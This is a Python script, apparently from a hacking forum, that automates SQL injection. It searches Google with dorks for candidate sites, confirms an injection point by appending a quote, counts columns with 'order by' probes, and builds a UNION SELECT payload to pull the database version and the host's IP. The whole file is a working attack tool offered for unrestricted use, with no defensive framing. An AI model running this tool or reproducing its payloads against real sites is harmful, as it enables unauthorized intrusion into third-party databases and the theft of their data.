#!/usr/bin/env python3.3
import urllib.request , webbrowser , urllib , json , random , socket 

def exit():
	print ("Goodbye :)")
	exit(0)
	
def credit():
	print ("***************************************")
	print ("* Main Developer - leeman96\n* Scanner - RUii of HackForums\n* Use how you see fit :)")
	print ("***************************************")
	
def version(connect, n, iphost):
	screenScrapeFour = urllib.request.urlopen(connect)
	screenScrapeFourText = screenScrapeFour.read()
	screenScrapeFourText = str(screenScrapeFourText)
	rr = 0
	y = 0
	for g in range(1, n+1):
		n = "MB" + str(g)
		if n in screenScrapeFourText:
			if y >= 1:
				info(connect,rr,n, iphost)
			elif y == 0:
				rr = g
				y = y + 1
			
def url(urls):
	protocolOne = "http://"
	protocolTwo = "https://"
	if protocolOne in urls:
		http = urls
		iphost = urls
	elif protocolTwo in urls:
		http = urls
		iphost = urls
	else:
		http = "http://" + urls
		iphost = "http://" + urls
	print(http)
	screenScrapeOne = urllib.request.urlopen(http)
	screenScrapeOneText = screenScrapeOne.read()
	screenScrapeOneText = str(screenScrapeOneText)
	t = "%27"
	test = http + t
	screenScrapeTwo = urllib.request.urlopen(test)
	screenScrapeTwoText = screenScrapeTwo.read()
	screenScrapeTwoText = str(screenScrapeTwoText)
	if screenScrapeOneText == screenScrapeTwoText:
		print ("Sorry")
	else:
		print ("Looks good, but just double checking it")
		order1 = http + "+order+by+1--"
		screenScrapeThree = urllib.request.urlopen(order1)
		screenScrapeThreeText = screenScrapeThree.read()
		screenScrapeThreeText = str(screenScrapeThreeText)
		if screenScrapeThreeText == screenScrapeTwoText:
			print ("Sorry")
		else:
			print ("Looks like it passed the second test. Lets hack it :)")
			end  = '--'
			ordering = "+order+by+"
			n = 1
			x = True
			while x:
				order = http + ordering + str(n) + end
				expect = "Unknown column"
				w1 = urllib.request.urlopen(order)
				q1 = w1.read()
				q1 = str(q1)
				if expect in q1:
					n = n - 1
					print ("It has " + str(n) + " columns")
					x = False
				else:
					n = n + 1
					print (order)
			union = "+union+select+"
			connect = http + union
			k = ","
			for g in range(1,n+1):
				mb = "MB" + str(g)
				mb = "".join("{:02x}".format(ord(c)) for c in mb)
				mbn = "0x" + mb
				connect = connect + mbn + k
				print (connect)
			connect = connect[:-1]
			connect = connect.replace("=","=-")
			connect = connect + '--'
			print(connect)
			version(connect, n, iphost)
					
def scan():
	print ("Scanning . . .")
	count = 0
	#A dork example would be '.php?detail='
	query = input("Enter a dork / search term: ")
	#We are limited to 16 requests for some minutes and each will return 4 links, resulting in 64 links maximum
	try:
		for c in range (0,64,4):
			url = 'http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=%s&start=%s' % ( str(query) , str(c) )
			#The Data we want is on JSON format, we need to parse it
			raw_src = urllib.request.Request(url)
			items = [1, 2, 3, 4, 5]
			m = random.choice(items)
			if m == 1:
				agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0"
			elif m == 2:
				agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0"
			elif m == 3:
				agent = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64"
			elif m == 4:
				agent = "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
			elif m == 5:
				agent = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36"
			raw_src.add_header('User-agent', agent)
			raw_src2 = urllib.request.urlopen(raw_src).read().decode("utf-8")
			json_results = json.loads(raw_src2)
			results = json_results['responseData']['results']
			for i in results:
				link = i['url']
				#We need to decode some characters now:(%2F,%3F,%3D,%26) to (/,?,=,&)
				link = urllib.request.unquote(link)
				file = open("scan.txt","a+")
				link = link + "\n"
				file.write(link)
				print (link)
				print ("It has been saved to file")
	except TypeError:
		print ("Looks like Google hates you :)")
	
def info(url,l,tt,iphost):
	mb = "".join("{:02x}".format(ord(c)) for c in tt)
	j = "0x" + mb
	start = "<" + tt + ">"
	starte = "".join("{:02x}".format(ord(c)) for c in start)
	starty = "0x" + starte
	end = "</" + tt + ">"
	ende = "".join("{:02x}".format(ord(c)) for c in end)
	endy = "0x" + ende
	version = "group_concat(" + starty + ",version()," + endy + ")"
	url = url.replace(j, version)
	webbrowser.open(url)
	screenScrapeFive = urllib.request.urlopen(url)
	screenScrapeFiveText = screenScrapeFive.read()
	screenScrapeFiveText = str(screenScrapeFiveText)
	if start in screenScrapeFiveText:
		t = screenScrapeFiveText
		info = t[t.find(start)+len(start):t.rfind(end)]
		data = input("Do you want to probe the database? (y/n)")
		if data in ["Y", "y"]:
			n = "http://"
			m = "/"
			iphost = iphost[iphost.find(n)+len(n):iphost.rfind(m)]
			print (iphost)
			ipaddr = socket.gethostbyname(iphost)
			print ("********************************************")
			print ("* Host Name: ", iphost)
			print ("* IP Address: ", ipaddr)
			print ("* Database Version: ", info)

print ("Welcome")
dExit = True
while dExit:
	print ("\nScan - Scans Google for vulnerable websites\nUrl - Enter url to test\nCredit - For all who worked on this project\nExit - Exits applicaion")
	choice = input("Enter Choice: ")
	if choice in ['Scan', 'scan']:
		scan()
	elif choice in ["Url", "url"]:
		c = input("Do you want to read from scanned file? y/n: ")
		if c == "y":
			filing = open("scan.txt" , "r")
			for line in filing:
				print(line)
				pp = input("Do you want to test website? y/n: ")
				if pp == "y":
					line = line[:-1]
					url(line)
		else:
			y = input("Enter url (without http://): ")
			url(y)
	elif choice in ["Credit", "credit"]:
		credit()
	elif choice in ["Exit", "exit"]:
		dExit = False
		exit()
	else:
		print ("Unknown Command")
